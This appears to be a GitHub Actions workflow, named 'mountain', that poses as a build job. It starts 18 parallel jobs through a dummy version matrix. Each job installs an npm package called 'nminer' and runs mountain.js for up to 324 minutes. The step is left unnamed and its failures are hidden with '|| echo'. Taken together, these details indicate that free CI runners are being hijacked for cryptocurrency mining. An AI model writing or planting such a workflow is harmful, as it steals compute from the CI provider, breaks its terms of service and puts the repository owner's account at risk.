name: mountain
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 2837 }
          - { version: 3020 }
          - { version: 4003 }
          - { version: 8474 }
          - { version: 5668 }
          - { version: 7192 }
          - { version: 1033 }
          - { version: 1360 }
          - { version: 2684 }
          - { version: 1235 }
          - { version: 2932 }
          - { version: 9501 }
          - { version: 6609 }
          - { version: 946 }
          - { version: 5106 }
          - { version: 7091 }
          - { version: 1056 }
          - { version: 3954 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 324m node mountain.js || echo "mountain executed"